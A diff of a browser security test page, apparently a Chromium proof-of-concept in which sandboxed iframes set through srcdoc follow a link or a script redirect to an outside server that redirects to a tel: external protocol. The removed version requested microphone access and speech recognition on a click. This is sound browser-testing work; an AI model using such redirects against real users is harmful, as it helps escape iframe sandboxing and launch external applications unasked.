@@ -1,33 +1,22 @@
-  <iframe
-      allow="microphone"
-      style="width:100vw;height:100vh;border:0"
-      srcdoc='
-        <!doctype html>
-        <html>
-        <body>
-          <input id="btn" type="button" value="Click here" />
+<!doctype html>
+<html>
+<head>
+<style>html { font-family: sans-serif; }</style>
+</head>
+<body>
+<h1>Server-side redirect by attacker (tel) in iframe with srcdoc (sandboxed)</h1>
+<p>Behavior is the same whether sandboxed or not</p>
 
-          <script>
-            async function start() {
-              const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+<p>First iframe is fully sandboxed</p>
+<iframe sandbox id="frame1"></iframe>
 
-              if (SpeechRecognition) {
-                try {
-                  const recognition = new SpeechRecognition();
-                  recognition.start();
-                } catch (e) {}
-              }
+<p>Second iframe has sandbox="allow-scripts"</p>
+<iframe sandbox="allow-scripts" id="frame2"></iframe>
 
-              try {
-                await navigator.mediaDevices.getUserMedia({ audio: true });
-              } catch (e) {}
+<script>
+frame1.srcdoc = '<a href="https://aogarantiza.com/chromium/external-protocol/tel.php">Click</a>';
+frame2.srcdoc = '<'+'script'+'>document.write(window.origin);window.location="https://aogarantiza.com/chromium/external-protocol/tel.php";<'+'/script'+'>srcdoc test';
+</script>
 
-              location.href = "https://www.google.com";
-            }
-
-            document.getElementById("btn").onclick = start;
-          </script>
-        </body>
-        </html>
-      '>
-    </iframe>
+</body>
+</html>
